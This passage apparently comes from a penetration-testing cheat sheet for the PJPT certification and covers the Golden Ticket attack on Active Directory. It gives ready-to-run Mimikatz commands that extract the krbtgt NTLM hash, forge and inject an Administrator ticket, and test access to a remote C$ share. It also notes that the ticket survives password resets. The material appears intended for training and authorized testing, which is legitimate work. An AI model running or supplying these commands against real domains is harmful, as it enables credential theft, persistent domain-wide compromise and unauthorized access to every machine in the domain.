- `<DC_IP>` — Domain controller IP address.

</details>

### 7.3 Golden Ticket Attack <sup>· PJPT</sup>

**Execute in Mimikatz:**

```
privilege::debug
lsadump::lsa /inject /name:krbtgt
kerberos::golden /User:Administrator /domain:<DOMAIN> /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_NTLM_HASH> /id:500 /ptt
misc::cmd
kerberos::list
```

**Verify access to a remote machine:**

```cmd
dir \\<MACHINE_NAME>\c$
```

<details>
<summary>Details</summary>

**Description**

- A Golden Ticket grants unrestricted access to any resource in the domain by forging TGTs signed with the krbtgt account hash.
- Requires the domain SID (obtained via impacket-lookupsid or BloodHound) and the NTLM hash of the krbtgt account (obtained via DCSync or NTDS.dit dump).
- Persistence is retained even if all user passwords are changed, as long as the krbtgt hash remains valid.
- Verify success by accessing an administrative share (e.g. `C$`) on another domain machine.

**Commands**

- `lsadump::lsa /inject /name:krbtgt` — Extracts the krbtgt NTLM hash and domain SID.
- `kerberos::golden ... /ptt` — Creates and injects a Golden Ticket into the current session.
- `misc::cmd` — Opens a new command prompt with the injected ticket.
- `kerberos::list` — Lists all Kerberos tickets to verify the Golden Ticket was injected.
- `dir \\<MACHINE_NAME>\c$` — Tests access to a remote machine's C$ administrative share.

</details>
